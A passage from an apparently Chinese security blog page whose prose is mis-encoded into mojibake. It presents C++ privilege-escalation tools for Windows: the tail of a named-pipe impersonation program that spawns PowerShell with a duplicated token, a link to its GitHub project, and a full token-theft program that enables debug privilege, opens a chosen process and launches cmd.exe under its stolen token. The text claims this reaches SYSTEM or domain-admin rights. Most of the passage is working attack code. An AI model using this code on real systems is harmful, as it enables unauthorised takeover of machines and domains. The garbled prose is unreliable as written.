      std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    }

    CHAR command1[] = &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;
    WCHAR command2[] = L&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;
    HANDLE Token;
    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) {
      std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    }
    else {
      std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl;
    }
    if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) {
      std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl;
      if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) {
        std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
      }
      else {
        std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;
      }
    }
    else {
      std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;
    }

    while(1){}
  }
</code></pre>
<p>æˆ‘ä»¬ç”Ÿæˆäº†Service.exe,ç„¶åæŠŠä»–ç§»åˆ°Server.exeåŒçº§ç›®å½•ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡ŒServer.exe,å³å¯è¾¾åˆ°admin-ã€‹systemçš„ææƒã€‚</p>
<p><img alt="QQæˆªå›¾20210217144553" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144553.png" title="QQæˆªå›¾20210217144553" /></p>
<p>ç¨‹åºå†™äº†å››å¤©ç»ˆäºå†™å¥½äº†ã€‚ã€‚WIN7ä¸‹å¯ä»¥å®ç°å®Œç¾ææƒã€‚
é¡¹ç›®åœ°å€:<a href="https://github.com/ConsT27/EvilNamedPipe/tree/1.0" title="https://github.com/ConsT27/EvilNamedPipe/tree/1.0">https://github.com/ConsT27/EvilNamedPipe/tree/1.0</a></p>
<h2 id="_10">ä»¤ç‰Œçªƒå–</h2>
<p>SYSTEM-&gt;æœ¬æœºä¸Šå…¶ä»–ç”¨æˆ·ï¼ˆåŒ…æ‹¬åŸŸç”¨æˆ·ï¼‰(å¥½å®¶ä¼™ï¼Œåªè¦æœ¬æœºæœ‰systemæƒé™ï¼ŒåŸŸç®¡æ•¢åœ¨æœ¬æœºä¸Šåˆ›å»ºè¿›ç¨‹å°±ç›´æ¥èƒ½æ‹¿åˆ°åŸŸç®¡æƒé™ï¼‰ æˆ–è€…adminè·å–debugæƒé™åå»è·å–SYSTEMæƒé™ï¼ˆè¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œåªæœ‰ownerä¸ºadministratorçš„SYSTEMè¿›ç¨‹æ‰èƒ½è¢«åˆ©ç”¨ï¼Œæ¯”å¦‚lsassï¼Œdllhost)</p>
<p>æŠ€æœ¯ç»†èŠ‚:é€šè¿‡å¯»æ‰¾é«˜æƒé™å¼€å¯çš„è¿›ç¨‹ï¼Œå†å¤åˆ¶å…¶ä»¤ç‰Œç”¨ä»¥åˆ›å»ºæ–°è¿›ç¨‹ï¼Œå³å¯è¾¾åˆ°ææƒç›®çš„</p>
<pre><code class="language-çº¯æ–‡æœ¬">#include &lt;iostream&gt;
#include &lt;Windows.h&gt;


//Only administrator can get debug priv
BOOL GetDebugPriv() {
  HANDLE Token;
  TOKEN_PRIVILEGES tp;
  LUID Luid;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) {
    std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    return false;
  }

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) {
    std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    return false;
  }
  tp.Privileges[0].Luid = Luid;
  if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) ){
    std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    return false;
  }
  if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    return false;
  }
  else {
    return true;
  }
}



int main(int argc, char* argv[]) {
  HANDLE t_process;
  HANDLE token = NULL;
  HANDLE token_bak = NULL;
  DWORD process_id;
  sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id);
  WCHAR command[] = L&quot;C:\\Windows\\System32\\cmd.exe&quot;;
  STARTUPINFO startupInfo;
  PROCESS_INFORMATION processInformation;
  ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO));
  ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION));
  startupInfo.cb = sizeof(STARTUPINFO);
  std::cout &lt;&lt; argv[1] &lt;&lt; std::endl;
  std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl;
  if (GetDebugPriv()== TRUE) {
    std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl;
  }
  else {
    std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl;
  }
  system(&quot;whoami /priv&quot;);
  t_process = OpenProcess(PROCESS_ALL_ACCESS, true, process_id);
  if (!t_process) {
    std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
  }
  if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) {
    std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
  }

  if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) {
    std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
  }
  if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) {
    std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
  }
  return 0;
}
</code></pre>
<p><img alt="QQæˆªå›¾20210217144620" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144620.png" title="QQæˆªå›¾20210217144620" /></p>
<p>è¿™æ˜¯åœ¨win7ä¸‹çš„æµ‹è¯•ç»“æœ const\administrator æ˜¯åŸŸæ§</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E6%96%B0%E9%A1%B5%E9%9D%A2/%E6%96%B0%E9%A1%B5%E9%9D%A2/" class="btn btn-xs btn-link">
        æ–°é¡µé¢
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/Windows%E4%B8%8B%E5%8F%AF%E6%8F%90%E6%9D%83%E7%9A%84%E4%B9%9D%E7%A7%8D%E6%9D%83%E9%99%90/" class="btn btn-xs btn-link">
        Windowsä¸‹å¯ææƒçš„ä¹ç§æƒé™
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>